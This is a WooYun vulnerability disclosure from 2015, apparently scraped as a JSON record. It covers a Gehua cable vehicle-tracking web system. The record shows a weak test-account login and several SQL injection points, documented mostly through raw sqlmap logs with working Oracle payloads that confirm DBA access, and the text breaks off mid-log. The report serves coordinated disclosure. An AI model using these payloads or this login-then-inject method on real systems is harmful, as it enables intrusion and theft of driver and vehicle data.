{"id": 66899, "wybug_id": "wooyun-2015-0142312", "wybug_title": "歌华有线车辆定位系统存在弱口令及多处SQL注入打包（可监控数百车辆+用户信息+DBA权限）", "wybug_corp": "cncert国家互联网应急中心", "wybug_author": "路人甲", "wybug_date": "2015-09-22 09:51", "wybug_open_date": "2015-11-08 15:58", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["数字类型注射", "字符类型注射"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-09-22：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-09-24：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-10-04：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-10-14：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-10-24：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-11-08：\t细节向公众公开  简要描述： 本来以为登录注入框被修复注入不了了，没想到从一个弱口令开始了SQL注入旅程！~~~ 详细说明：  PS：在提交完的后，发现该弱密码用户被改了密码了！~~~不过登录进去后的注入点还是在的！~~~1、弱口令登录\n**.**.**.**/\ntest\t1111112、cookie存在注入用test账户登录后，刷新页面抓包，cookie存在注入。company_id参数存在注入--dbms \"Oracle\"似乎登录了才能测试到，在登录框测试中cookie中的参数注入不到。上sqlmap测试结果如下，DBA权限。而且都是弱口令哦，这里我就不多说了，管理员自查吧！~~~还有其他的数据库，就不继续测试了，点到为止！~~~\n\n\n\n\n\n\n\n\n\n\n\n3、get注入依旧是company_id参数，同样是刷新页面抓包得到！~~~\n**.**.**.**/motor_api/motor_ajax_baidu_latlng.php?company_id=1970 (POST)rand=0.3906304221848003\n\n[23:07:17] [INFO] heuristic (basic) test shows that GET parameter 'company_id' might be injectable (possible DBMS: 'Oracle')[23:07:17] [INFO] testing for SQL injection on GET parameter 'company_id'[23:07:17] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'[23:07:18] [WARNING] reflective value(s) found and filtering out[23:07:28] [INFO] GET parameter 'company_id' seems to be 'AND boolean-based blind - WHERE or HAVING clause' injectable[23:07:28] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'[23:07:28] [INFO] GET parameter 'company_id' is 'Oracle AND error-based - WHEREor HAVING clause (XMLType)' injectable[23:07:28] [INFO] testing 'Oracle inline queries'[23:07:28] [INFO] testing 'Oracle AND time-based blind'[23:07:33] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'[23:07:33] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found[23:07:34] [INFO] ORDER BY technique seems to be usable. This should reduce thetime needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test[23:07:35] [INFO] target URL appears to have 4 columns in queryinjection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n] yGET parameter 'company_id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] ysqlmap identified the following injection points with a total of 68 HTTP(s) requests:---Place: GETParameter: company_id    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: company_id=1970' AND 7340=7340 AND 'qZZA'='qZZA    Type: error-based    Title: Oracle AND error-based - WHERE or HAVING clause (XMLType)    Payload: company_id=1970' AND 4090=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(122)||CHR(117)||CHR(103)||CHR(113)||(SELECT (CASE WHEN (4090=4090)THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(121)||CHR(118)||CHR(114)||CHR(113)||CHR(62))) FROM DUAL) AND 'ZTrA'='ZTrA---[23:07:54] [INFO] the back-end DBMS is Oracleweb application technology: PHP 5.3.28back-end DBMS: Oracle[23:08:26] [INFO] fetching current user[23:08:27] [WARNING] reflective value(s) found and filtering out[23:08:27] [INFO] retrieved: SHMOTOcurrent user:    'SHMOTO'[23:08:27] [INFO] fetching current database[23:08:27] [INFO] resumed: SHMOTO[23:08:27] [WARNING] on Oracle you'll need to use schema names for enumeration as the counterpart to database names on other DBMSescurrent schema (equivalent to database on Oracle):    'SHMOTO'[23:08:27] [INFO] testing if current user is DBAcurrent user is DBA:    True\n4、注入点三：看看抓包情况车辆基本信息之车辆列表：\n**.**.**.**/device_list_text.php?chepaihao=1&driver=2&company_level=1970&sub1=%E6%9F%A5%E8%AF%A2&cck%5B%5D=TCD_CAR_NUMBER&cck%5B%5D=TCD_CAR_MODEL&cck%5B%5D=TCD_DRIVER&cck%5B%5D=TCD_DRIVER_MOBILE&cck%5B%5D=TCD_BUYCARTIME&cck%5B%5D=TCD_INSUREENDTIME&cck%5B%5D=TCD_CHEWEIINFO&cck%5B%5D=TCD_CAR_TYPE&cck%5B%5D=TCI_COMPANY_NAME&cck%5B%5D=TCH_BIAOSHI&cck%5B%5D=DISTRICT_NUM&cck%5B%5D=TIME&cck%5B%5D=IMEI&cck%5B%5D=SIM\nchepaihao、driver均存在注入回车管理（test帐号没有权限）车辆保养\n**.**.**.**/alarm_baoyang.php?chepaihao=1&driver=2&company_level=1970&sub1=%E6%9F%A5%E8%AF%A2\nchepaihao、driver均存在注入\nsqlmap identified the following injection points with a total of 393 HTTP(s) requests:---Place: GETParameter: chepaihao    Type: error-based    Title: Oracle AND error-based - WHERE or HAVING clause (XMLType)    Payload: chepaihao=1%' AND 1446=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(105)||CHR(111)||CHR(103)||CHR(113)||(SELECT (CASE WHEN (1446=1446) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(122)||CHR(119)||CHR(115)||CHR(113)||CHR(62))) FROM DUAL) AND '%'='&driver=2&company_level=1970&sub1=%E6%9F%A5%E8%AF%A2&cck[]=TCD_CAR_NUMBER&cck[]=TCD_CAR_MODEL&cck[]=TCD_DRIVER&cck[]=TCD_DRIVER_MOBILE&cck[]=TCD_BUYCARTIME&cck[]=TCD_INSUREENDTIME&cck[]=TCD_CHEWEIINFO&cck[]=TCD_CAR_TYPE&cck[]=TCI_COMPANY_NAME&cck[]=TCH_BIAOSHI&cck[]=DISTRICT_NUM&cck[]=TIME&cck[]=IMEI&cck[]=SIM    Type: AND/OR time-based blind    Title: Oracle AND time-based blind    Payload: chepaihao=1%' AND 7948=DBMS_PIPE.RECEIVE_MESSAGE(CHR(71)||CHR(104)||CHR(116)||CHR(109),5) AND '%'='&driver=2&company_level=1970&sub1=%E6%9F%A5%E8%AF%A2&cck[]=TCD_CAR_NUMBER&cck[]=TCD_CAR_MODEL&cck[]=TCD_DRIVER&cck[]=TCD_DRIVER_MOBILE&cck[]=TCD_BUYCARTIME&cck[]=TCD_INSUREENDTIME&cck[]=TCD_CHEWEIINFO&cck[]=TCD_CAR_TYPE&cck[]=TCI_COMPANY_NAME&cck[]=TCH_BIAOSHI&cck[]=DISTRICT_NUM&cck[]=TIME&cck[]=IMEI&cck[]=SIMPlace: GETParameter: driver    Type: error-based    Title: Oracle AND error-based - WHERE or HAVING clause (XMLType)    Payload: chepaihao=1&driver=2%' AND 7689=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(105)||CHR(111)||CHR(103)||CHR(113)||(SELECT (CASE WHEN (7689=7689) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(122)||CHR(119)||CHR(115)||CHR(113)||CHR(62))) FROM DUAL) AND '%'='&company_level=1970&sub1=%E6%9F%A5%E8%AF%A2&cck[]=TCD_CAR_NUMBER&cck[]=TCD_CAR_MODEL&cck[]=TCD_DRIVER&cck[]=TCD_DRIVER_MOBILE&cck[]=TCD_BUYCARTIME&cck[]=TCD_INSUREENDTIME&cck[]=TCD_CHEWEIINFO&cck[]=TCD_CAR_TYPE&cck[]=TCI_COMPANY_NAME&cck[]=TCH_BIAOSHI&cck[]=DISTRICT_NUM&cck[]=TIME&cck[]=IMEI&cck[]=SIM    Type: AND/OR time-based blind    Title: Oracle AND time-based blind    Payload: chepaihao=1&driver=2%' AND 6850=DBMS_PIPE.RECEIVE_MESSAGE(CHR(100)||CHR(107)||CHR(109)||CHR(82),5) AND '%'='&company_level=1970&sub1=%E6%9F%A5%E8%AF%A2&cck[]=TCD_CAR_NUMBER&cck[]=TCD_CAR_MODEL&cck[]=TCD_DRIVER&cck[]=TCD_DRIVER_MOBILE&cck[]=TCD_BUYCARTIME&cck[]=TCD_INSUREENDTIME&cck[]=TCD_CHEWEIINFO&cck[]=TCD_CAR_TYPE&cck[]=TCI_COMPANY_NAME&cck[]=TCH_BIAOSHI&cck[]=DISTRICT_NUM&cck[]=TIME&cck[]=IMEI&cck[]=SIM---there were multiple injection points, please select the one to use for following injections:[0] place: GET, parameter: chepaihao, type: Single quoted string (default)[1] place: GET, parameter: driver, type: Single quoted string[q] Quit> 0[23:42:24] [INFO] the back-end DBMS is Oracleweb application technology: PHP 5.3.28back-end DBMS: Oracle[23:42:24] [INFO] fetching current user[23:42:25] [INFO] retrieved: SHMOTOcurrent user:    'SHMOTO'[23:42:25] [INFO] fetching current database[23:42:25] [INFO] resumed: SHMOTO[23:42:25] [WARNING] on Oracle you'll need to use schema names for enumeration as the counterpart to database names on other DBMSescurrent schema (equivalent to database on Oracle):    'SHMOTO'[23:42:25] [INFO] testing if current user is DBAcurrent user is DBA:    True\n5、注入点四：报警数据之超速报警：\n**.**.**.**/alarm_speed.php?chepaihao=1&driver=2&starttime=2015-09-01&endtime=2015-09-03&company_id=1970&sub1=%E6%90%9C%E7%B4%A2&cck%5B%5D=TCD_CAR_NUMBER&cck%5B%5D=CREATETIME&cck%5B%5D=SPEED&cck%5B%5D=TCD_SPEED_SETTING&cck%5B%5D=TCI_COMPANY_NAME&cck%5B%5D=TCD_DRIVER&cck%5B%5D=TCD_DRIVER_MOBILE\n越界报警：\n**.**.**.**/alarm_range.php?driver=1&starttime=2015-09-02&endtime=2015-09-02&company_id=1970&chepaihao=2&sub1=%E6%90%9C%E7%B4%A2&cck%5B%5D=TCD_CAR_NUMBER&cck%5B%5D=CREATETIME&cck%5B%5D=FORB_CONTENT&cck%5B%5D=TCI_COMPANY_NAME&cck%5B%5D=TCD_DRIVER&cck%5B%5D=TCD_DRIVER_MOBILE\n回车报警：\n**.**.**.**/alarm_stop.php?chepaihao=1&driver=2&starttime=2015-09-16&endtime=2015-09-17&company_id=1970&sub1=%E6%90%9C%E7%B4%A2&cck%5B%5D=TCD_CAR_NUMBER&cck%5B%5D=CREATETIME&cck%5B%5D=TCI_COMPANY_NAME&cck%5B%5D=TCD_DRIVER&cck%5B%5D=TCD_DRIVER_MOBILE&cck%5B%5D=TCH_BIAOSHI&cck%5B%5D=FORB_CONTENT\nchepaihao、driver、starttime、endtime、company_id均存在注入\n[23:46:55] [INFO] target URL is stable[23:46:55] [INFO] testing if GET parameter 'chepaihao' is dynamic[23:46:55] [WARNING] GET parameter 'chepaihao' does not appear dynamic[23:46:55] [INFO] heuristic (basic) test shows that GET parameter 'chepaihao' might be injectable (possible DBMS: 'Oracle')[23:46:55] [INFO] testing for SQL injection on GET parameter 'chepaihao'[23:46:55] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'[23:46:56] [WARNING] reflective value(s) found and filtering out[23:47:06] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'[23:47:07] [INFO] GET parameter 'chepaihao' is 'Oracle AND error-based - WHERE or HAVING clause (XMLType)' injectable[23:47:07] [INFO] testing 'Oracle inline queries'[23:47:07] [INFO] testing 'Oracle AND time-based blind'[23:47:07] [CRITICAL] there is considerable lagging in connection response(s). Please use as high value for option '--time-sec' as possible (e.g. 10 or more)[23:47:28] [INFO] GET parameter 'chepaihao' seems to be 'Oracle AND time-based blind' injectable[23:47:28] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'[23:47:28] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found[23:47:41] [INFO] target URL appears to be UNION injectable with 1 columnsGET parameter 'chepaihao' is vulnerable. Do you want to keep testing the others(if any)? [y/N] y[23:47:45] [INFO] testing if GET parameter 'driver' is dynamic[23:47:46] [WARNING] GET parameter 'driver' does not appear dynamic[23:47:46] [INFO] heuristic (basic) test shows that GET parameter 'driver' might be injectable (possible DBMS: 'Oracle')[23:47:46] [INFO] testing for SQL injection on GET parameter 'driver'[23:47:46] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'[23:47:56] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'[23:47:58] [INFO] GET parameter 'driver' is 'Oracle AND error-based - WHERE or HAVING clause (XMLType)' injectable[23:47:58] [INFO] testing 'Oracle inline queries'[23:47:58] [INFO] testing 'Oracle AND time-based blind'[23:48:18] [INFO] GET parameter 'driver' seems to be 'Oracle AND time-based blind' injectable[23:48:18] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'GET parameter 'driver' is vulnerable. Do you want to keep testing the others (if any)? [y/N] y[23:48:31] [INFO] testing if GET parameter 'starttime' is dynamic[23:48:32] [WARNING] GET parameter 'starttime' does not appear dynamic[23:48:32] [INFO] heuristic (basic) test shows that GET parameter 'starttime' might be injectable (possible DBMS: 'Oracle')[23:48:32] [INFO] testing for SQL injection on GET parameter 'starttime'[23:48:32] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'[23:48:36] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'[23:48:37] [INFO] GET parameter 'starttime' is 'Oracle AND error-based - WHERE or HAVING clause (XMLType)' injectable[23:48:37] [INFO] testing 'Oracle inline queries'[23:48:37] [INFO] testing 'Oracle AND time-based blind'[23:48:58] [INFO] GET parameter 'starttime' seems to be 'Oracle AND time-based blind' injectable[23:48:58] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'GET parameter 'starttime' is vulnerable. Do you want to keep testing the others(if any)? [y/N] y[23:49:06] [INFO] testing if GET parameter 'endtime' is dynamic[23:49:06] [WARNING] GET parameter 'endtime' does not appear dynamic[23:49:06] [INFO] heuristic (basic) test shows that GET parameter 'endtime' might be injectable (possible DBMS: 'Oracle')[23:49:06] [INFO] testing for SQL injection on GET parameter 'endtime'[23:49:06] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'[23:49:10] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'[23:49:11] [INFO] GET parameter 'endtime' is 'Oracle AND error-based - WHERE orHAVING clause (XMLType)' injectable[23:49:11] [INFO] testing 'Oracle inline queries'[23:49:11] [INFO] testing 'Oracle AND time-based blind'[23:49:31] [INFO] GET parameter 'endtime' seems to be 'Oracle AND time-based blind' injectable[23:49:31] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'GET parameter 'endtime' is vulnerable. Do you want to keep testing the others (if any)? [y/N] y[23:49:40] [INFO] testing if GET parameter 'company_id' is dynamic[23:49:40] [WARNING] GET parameter 'company_id' does not appear dynamic[23:49:40] [INFO] heuristic (basic) test shows that GET parameter 'company_id' might be injectable (possible DBMS: 'Oracle')[23:49:40] [INFO] testing for SQL injection on GET parameter 'company_id'[23:49:40] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'[23:49:47] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'[23:49:49] [INFO] testing 'Oracle inline queries'[23:49:49] [INFO] testing 'Oracle AND time-based blind'[23:50:09] [INFO] GET parameter 'company_id' seems to be 'Oracle AND time-basedblind' injectable[23:50:09] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'[23:50:16] [INFO] checking if the injection point on GET parameter 'company_id'is a false positiveGET parameter 'company_id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] nsqlmap identified the following injection points with a total of 252 HTTP(s) requests:---Place: GETParameter: company_id    Type: AND/OR time-based blind    Title: Oracle AND time-based blind    Payload: chepaihao=1&driver=2&starttime=2015-09-01&endtime=2015-09-03&company_id=1970' AND 1087=DBMS_PIPE.RECEIVE_MESSAGE(CHR(122)||CHR(114)||CHR(116)||CHR(84),5) AND 'lOTO'='lOTO&sub1=%E6%90%9C%E7%B4%A2&cck[]=TCD_CAR_NUMBER&cck[]=CREATETIME&cck[]=SPEED&cck[]=TCD_SPEED_SETTING&cck[]=TCI_COMPANY_NAME&cck[]=TCD_DRIVER&cck[]=TCD_DRIVER_MOBILEPlace: GETParameter: chepaihao    Type: error-based    Title: Oracle AND error-based - WHERE or HAVING clause (XMLType)    Payload: chepaihao=1%' AND 9200=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(112)||CHR(109)||CHR(116)||CHR(113)||(SELECT (CASE WHEN (9200=9200) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(103)||CHR(117)||CHR(101)||CHR(113)||CHR(62))) FROM DUAL) AND '%'='&driver=2&starttime=2015-09-01&endtime=2015-09-03&company_id=1970&sub1=%E6%90%9C%E7%B4%A2&cck[]=TCD_CAR_NUMBER&cck[]=CREATETIME&cck[]=SPEED&cck[]=TCD_SPEED_SETTING&cck[]=TCI_COMPANY_NAME&cck[]=TCD_DRIVER&cck[]=TCD_DRIVER_MOBILE    Type: AND/OR time-based blind    Title: Oracle AND time-based blind    Payload: chepaihao=1%' AND 6894=DBMS_PIPE.RECEIVE_MESSAGE(CHR(81)||CHR(105)||CHR(104)||CHR(108),5) AND '%'='&driver=2&starttime=2015-09-01&endtime=2015-09-03&company_id=1970&sub1=%E6%90%9C%E7%B4%A2&cck[]=TCD_CAR_NUMBER&cck[]=CREATETIME&cck[]=SPEED&cck[]=TCD_SPEED_SETTING&cck[]=TCI_COMPANY_NAME&cck[]=TCD_DRIVER&cck[]=TCD_DRIVER_MOBILEPlace: GETParameter: endtime    Type: error-based    Title: Oracle AND error-based - WHERE or HAVING clause (XMLType)    Payload: chepaihao=1&driver=2&starttime=2015-09-01&endtime=2015-09-03' AND 8276=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(112)||CHR(109)||CHR(116)||CHR(113)||(SELECT (CASE WHEN (8276=8276) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(103)||CHR(117)||CHR(101)||CHR(113)||CHR(62))) FROM DUAL) AND 'PVWP'='PVWP&company_id=1970&sub1=%E6%90%9C%E7%B4%A2&cck[]=TCD_CAR_NUMBER&cck[]=CREATETIME&cck[]=SPEED&cck[]=TCD_SPEED_SETTING&cck[]=TCI_COMPANY_NAME&cck[]=TCD_DRIVER&cck[]=TCD_DRIVER_MOBILE    Type: AND/OR time-based blind    Title: Oracle AND time-based blind    Payload: chepaihao=1&driver=2&starttime=2015-09-01&endtime=2015-09-03' AND 1480=DBMS_PIPE.RECEIVE_MESSAGE(CHR(121)||CHR(118)||CHR(111)||CHR(98),5) AND 'Mwlh'='Mwlh&company_id=1970&sub1=%E6%90%9C%E7%B4%A2&cck[]=TCD_CAR_NUMBER&cck[]=CREATETIME&cck[]=SPEED&cck[]=TCD_SPEED_SETTING&cck[]=TCI_COMPANY_NAME&cck[]=TCD_DRIVER&cck[]=TCD_DRIVER_MOBILEPlace: GETParameter: starttime    Type: error-based    Title: Oracle AND error-based - WHERE or HAVING clause (XMLType)    Payload: chepaihao=1&driver=2&starttime=2015-09-01' AND 8085=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(112)||CHR(109)||CHR(116)||CHR(113)||(SELECT (CASE WHEN (8085=8085) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(103)||CHR(117)||CHR(101)||CHR(113)||CHR(62))) FROM DUAL) AND 'vVdE'='vVdE&endtime=2015-09-03&company_id=1970&sub1=%E6%90%9C%E7%B4%A2&cck[]=TCD_CAR_NUMBER&cck[]=CREATETIME&cck[]=SPEED&cck[]=TCD_SPEED_SETTING&cck[]=TCI_COMPANY_NAME&cck[]=TCD_DRIVER&cck[]=TCD_DRIVER_MOBILE    Type: AND/OR time-based blind    Title: Oracle AND time-based blind    Payload: chepaihao=1&driver=2&starttime=2015-09-01' AND 7943=DBMS_PIPE.RECEIVE_MESSAGE(CHR(114)||CHR(114)||CHR(81)||CHR(83),5) AND 'qKtt'='qKtt&endtime=2015-09-03&company_id=1970&sub1=%E6%90%9C%E7%B4%A2&cck[]=TCD_CAR_NUMBER&cck[]=CREATETIME&cck[]=SPEED&cck[]=TCD_SPEED_SETTING&cck[]=TCI_COMPANY_NAME&cck[]=TCD_DRIVER&cck[]=TCD_DRIVER_MOBILEPlace: GETParameter: driver    Type: error-based    Title: Oracle AND error-based - WHERE or HAVING clause (XMLType)    Payload: chepaihao=1&driver=2%' AND 7040=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(112)||CHR(109)||CHR(116)||CHR(113)||(SELECT (CASE WHEN (7040=7040) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(103)||CHR(117)||CHR(101)||CHR(113)||CHR(62))) FROM DUAL) AND '%'='&starttime=2015-09-01&endtime=2015-09-03&company_id=1970&sub1=%E6%90%9C%E7%B4%A2&cck[]=TCD_CAR_NUMBER&cck[]=CREATETIME&cck[]=SPEED&cck[]=TCD_SPEED_SETTING&cck[]=TCI_COMPANY_NAME&cck[]=TCD_DRIVER&cck[]=TCD_DRIVER_MOBILE    Type: AND/OR time-based blind    Title: Oracle AND time-based blind    Payload: chepaihao=1&driver=2%' AND 9809=DBMS_PIPE.RECEIVE_MESSAGE(CHR(119)||CHR(109)||CHR(84)||CHR(107),5) AND '%'='&starttime=2015-09-01&endtime=2015-09-03&company_id=1970&sub1=%E6%90%9C%E7%B4%A2&cck[]=TCD_CAR_NUMBER&cck[]=CREATETIME&cck[]=SPEED&cck[]=TCD_SPEED_SETTING&cck[]=TCI_COMPANY_NAME&cck[]=TCD_DRIVER&cck[]=TCD_DRIVER_MOBILE---there were multiple injection points, please select the one to use for following injections:[0] place: GET, parameter: chepaihao, type: Single quoted string (default)[1] place: GET, parameter: driver, type: Single quoted string[2] place: GET, parameter: starttime, type: Single quoted string[3] place: GET, parameter: endtime, type: Single quoted string[4] place: GET, parameter: company_id, type: Single quoted string[q] Quit> 0[23:50:44] [INFO] the back-end DBMS is Oracleweb application technology: PHP 5.3.28back-end DBMS: Oracle[23:50:44] [INFO] fetching current user[23:50:45] [INFO] retrieved: SHMOTOcurrent user:    'SHMOTO'[23:50:45] [INFO] fetching current database[23:50:45] [INFO] resumed: SHMOTO[23:50:45] [WARNING] on Oracle you'll need to use schema names for enumeration as the counterpart to database names on other DBMSescurrent schema (equivalent to database on Oracle):    'SHMOTO'[23:50:45] [INFO] testing if current user is DBAcurrent user is DBA:    True\n6、注入点五统计报表之：车辆里程油耗：\n**.**.**.**/tongji_mile_all.php?day1=2015-09-18&day2=2015-09-19&company_id=1970&chepaihao=1&sub1=%E6%90%9C%E7%B4%A2\nday1、day2、chepaihao存在注入\nsqlmap identified the following injection points with a total of 217 HTTP(s) requests:---Place: GETParameter: day1    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: day1=2015-09-18' AND 9093=9093 AND 'Rlpb'='Rlpb&day2=2015-09-19&company_id=1970&chepaihao=1&sub1=%E6%90%9C%E7%B4%A2    Type: error-based    Title: Oracle AND error-based - WHERE or HAVING clause (XMLType)    Payload: day1=2015-09-18' AND 1042=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(104)||CHR(99)||CHR(106)||CHR(113)||(SELECT (CASE WHEN (1042=1042) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(99)||CHR(103)||CHR(101)||CHR(113)||CHR(62))) FROM DUAL) AND 'iFGe'='iFGe&day2=2015-09-19&company_id=1970&chepaihao=1&sub1=%E6%90%9C%E7%B4%A2    Type: AND/OR time-based blind    Title: Oracle AND time-based blind    Payload: day1=2015-09-18' AND 4052=DBMS_PIPE.RECEIVE_MESSAGE(CHR(110)||CHR(120)||CHR(78)||CHR(78),5) AND 'iOma'='iOma&day2=2015-09-19&company_id=1970&chepaihao=1&sub1=%E6%90%9C%E7%B4%A2Place: GETParameter: chepaihao    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: day1=2015-09-18&day2=2015-09-19&company_id=1970&chepaihao=1%' AND 8535=8535 AND '%'='&sub1=%E6%90%9C%E7%B4%A2    Type: error-based    Title: Oracle AND error-based - WHERE or HAVING clause (XMLType)    Payload: day1=2015-09-18&day2=2015-09-19&company_id=1970&chepaihao=1%' AND 4817=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(104)||CHR(99)||CHR(106)||CHR(113)||(SELECT (CASE WHEN (4817=4817) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(99)||CHR(103)||CHR(101)||CHR(113)||CHR(62))) FROM DUAL) AND '%'='&sub1=%E6%90%9C%E7%B4%A2    Type: AND/OR time-based blind    Title: Oracle AND time-based blind    Payload: day1=2015-09-18&day2=2015-09-19&company_id=1970&chepaihao=1%' AND 2828=DBMS_PIPE.RECEIVE_MESSAGE(CHR(81)||CHR(77)||CHR(81)||CHR(83),5) AND '%'='&sub1=%E6%90%9C%E7%B4%A2Place: GETParameter: day2    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: day1=2015-09-18&day2=2015-09-19' AND 9339=9339 AND 'FiKs'='FiKs&company_id=1970&chepaihao=1&sub1=%E6%90%9C%E7%B4%A2    Type: error-based    Title: Oracle AND error-based - WHERE or HAVING clause (XMLType)    Payload: day1=2015-09-18&day2=2015-09-19' AND 1172=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(104)||CHR(99)||CHR(106)||CHR(113)||(SELECT (CASE WHEN (1172=1172) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(99)||CHR(103)||CHR(101)||CHR(113)||CHR(62))) FROM DUAL) AND 'DZyH'='DZyH&company_id=1970&chepaihao=1&sub1=%E6%90%9C%E7%B4%A2    Type: AND/OR time-based blind    Title: Oracle AND time-based blind    Payload: day1=2015-09-18&day2=2015-09-19' AND 4542=DBMS_PIPE.RECEIVE_MESSAGE(CHR(65)||CHR(115)||CHR(105)||CHR(88),5) AND 'akOs'='akOs&company_id=1970&chepaihao=1&sub1=%E6%90%9C%E7%B4%A2---there were multiple injection points, please select the one to use for following injections:[0] place: GET, parameter: day1, type: Single quoted string (default)[1] place: GET, parameter: day2, type: Single quoted string[2] place: GET, parameter: chepaihao, type: Single quoted string[q] Quit> 0[23:55:10] [INFO] the back-end DBMS is Oracleweb application technology: PHP 5.3.28back-end DBMS: Oracle[23:55:10] [INFO] fetching current user[23:55:10] [INFO] retrieved: SHMOTOcurrent user:    'SHMOTO'[23:55:10] [INFO] fetching current database[23:55:10] [INFO] resumed: SHMOTO[23:55:10] [WARNING] on Oracle you'll need to use schema names for enumeration as the counterpart to database names on other DBMSescurrent schema (equivalent to database on Oracle):    'SHMOTO'[23:55:10] [INFO] testing if current user is DBAcurrent user is DBA:    True\n分组里程油耗：（POST数据）\n**.**.**.**/tongji_mile.php (POST)day1=2015-09-18&day2=2015-09-19&sub1=%E6%90%9C%E7%B4%A2\n同样day1、day2存在注入\nsqlmap identified the following injection points with a total of 129 HTTP(s) requests:---Place: POSTParameter: day1    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: day1=2015-09-18' AND 3214=3214 AND 'gJvU'='gJvU&day2=2015-09-19&sub1=%E6%90%9C%E7%B4%A2    Type: error-based    Title: Oracle AND error-based - WHERE or HAVING clause (XMLType)    Payload: day1=2015-09-18' AND 1021=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(113)||CHR(110)||CHR(118)||CHR(113)||(SELECT (CASE WHEN (1021=1021)THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(117)||CHR(121)||CHR(119)||CHR(113)||CHR(62))) FROM DUAL) AND 'cZik'='cZik&day2=2015-09-19&sub1=%E6%90%9C%E7%B4%A2    Type: AND/OR time-based blind    Title: Oracle AND time-based blind    Payload: day1=2015-09-18' AND 2755=DBMS_PIPE.RECEIVE_MESSAGE(CHR(66)||CHR(106)||CHR(74)||CHR(79),5) AND 'PAWt'='PAWt&day2=2015-09-19&sub1=%E6%90%9C%E7%B4%A2Place: POSTParameter: day2    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: day1=2015-09-18&day2=2015-09-19' AND 1146=1146 AND 'DACt'='DACt&sub1=%E6%90%9C%E7%B4%A2    Type: error-based    Title: Oracle AND error-based - WHERE or HAVING clause (XMLType)    Payload: day1=2015-09-18&day2=2015-09-19' AND 2080=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(113)||CHR(110)||CHR(118)||CHR(113)||(SELECT (CASE WHEN (2080=2080) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(117)||CHR(121)||CHR(119)||CHR(113)||CHR(62))) FROM DUAL) AND 'JpCS'='JpCS&sub1=%E6%90%9C%E7%B4%A2    Type: AND/OR time-based blind    Title: Oracle AND time-based blind    Payload: day1=2015-09-18&day2=2015-09-19' AND 9230=DBMS_PIPE.RECEIVE_MESSAGE(CHR(119)||CHR(88)||CHR(104)||CHR(103),5) AND 'qvBw'='qvBw&sub1=%E6%90%9C%E7%B4%A2---there were multiple injection points, please select the one to use for following injections:[0] place: POST, parameter: day1, type: Single quoted string (default)[1] place: POST, parameter: day2, type: Single quoted string[q] Quit> 0[23:58:02] [INFO] the back-end DBMS is 